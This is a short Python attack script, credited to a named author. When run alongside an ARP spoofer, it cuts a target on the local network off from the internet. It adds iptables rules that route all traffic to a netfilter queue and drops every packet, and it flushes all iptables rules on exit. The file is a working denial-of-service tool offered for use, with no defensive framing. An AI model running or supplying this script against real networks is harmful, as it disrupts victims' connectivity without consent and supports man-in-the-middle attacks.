try:
    import netfilterqueue
    import subprocess
    import optparse


    def arguments():
        optparse.OptionParser.format_epilog = lambda self, formatter: self.epilog
        arguments = optparse.OptionParser(epilog="\nhow to use ?\n  1) start arp-spoofer\n  2) run this script\n\nThat's it the target can't access internet\n")
        arguments.parse_args()


    arguments()
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])


    def process_packet(packet):
        print("\r[+]Droping packets...target cant use internet", end="")
        packet.drop()

    print("\ncoded by @koushikk11\n")
    print("Date: 18/07/2021\n")
    print("Github: koushikfs\n")
    print("\nThis script will disconnect the target from internet while in arp-spoofing\n* Make sure arp-spoofer is running\n* Use -h for more\n")
    print("[+]adding iptables rules")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except (ModuleNotFoundError, ImportError) as e:
    print("[-]some modules are not installed on your pc\n\nRequired Modules:\n\n   NetfilterQueue\n   subprocess\n   optparse")
    print("\n[+]Quiting...")
    exit()
except KeyboardInterrupt:
    print("\n[+]flushing iptables...")
    subprocess.call(["iptables", "--flush"])
    print("[+]Quiting...")
    exit()
